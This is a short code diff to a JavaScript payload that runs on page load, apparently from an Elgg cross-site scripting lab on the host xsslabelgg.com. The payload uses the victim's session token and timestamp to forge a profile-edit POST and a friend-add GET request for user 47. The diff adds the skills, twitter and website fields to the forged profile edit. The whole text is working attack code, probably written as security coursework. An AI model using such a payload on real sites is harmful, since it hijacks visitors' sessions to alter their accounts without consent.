@@ -23,10 +23,13 @@ window.onload = function () {
     var location = "&location="+randomString(10)+"&accesslevel[location]=1";
     var mobile = "&mobile="+randomString(10)+"&accesslevel[mobile]=1";
     var phone = "&phone="+randomString(10)+"&accesslevel[phone]=1";
+    var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
+    var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
+    var website = "&website="+randomString(10)+"&accesslevel[website]=1";
 
 
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
-    var editContent =  guid + ts + token + description + briefdescription + interests + location + mobile + phone;
+    var editContent =  guid + ts + token + description + briefdescription + interests + location + mobile + phone + skills + twitter + website;
 
     var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
